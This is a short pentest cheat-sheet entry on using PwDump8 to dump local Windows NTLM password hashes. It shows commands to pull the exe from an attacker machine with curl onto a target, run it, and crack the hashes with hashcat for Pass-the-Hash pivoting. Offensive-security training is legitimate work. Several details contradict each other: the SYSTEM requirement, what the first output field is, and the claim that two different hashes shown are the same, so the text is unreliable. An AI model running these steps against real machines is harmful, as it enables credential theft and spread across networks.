## PwDump8
- Dumps all local account **NTLM hashes** (`LM:NT`) from the SAM database in `hashdump`-style output.
- **When to use**: Already have admin/`SYSTEM` access; want creds to **crack offline** (hashcat `-m 1000`) or reuse via **Pass-the-Hash** to pivot to other systems.
- **Why**: Local admin passwords are often reused on the network; recovered hashes/passwords get reported to the client.
- **Runs as**: SYSTEM / super-user account. No need to be SYSTEM — admin is enough.
- **Caveat**: Mimikatz `sekurlsa::logonpasswords` / `lsadump::sam` does the same, but PwDump is a single static exe — easy to drop and run.

#### Transfer & Run
```python
# on pwnbox: serve the exe
python3 -m http.server 8000

# on target: download and run
curl http://PWNIP:8000/pwdump8.exe -o C:\Windows\Temp\pwdump8.exe
C:\Windows\Temp\pwdump8.exe
```

#### Output Format
```python
username:RID:LM_HASH:NT_HASH
# Admin account -> first field is the RID (500 = local admin)
# LM hash all zeros (AAD3...) = empty/not stored; use the NT hash
Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:7796EE39FD3A9C3A1844556115AE1A54
```

#### Cracking with Hashcat
```python
# NTLM = mode 1000
hashcat -m 1000 NT_HASH /usr/share/wordlists/rockyou.txt
```
- Example: `wksadmin` hash `5835048CE94AD0564E29A924A03510EF` → `password1`
- Note the RID 500 `Administrator` and `wksadmin` share the same hash → same password (reused cred).
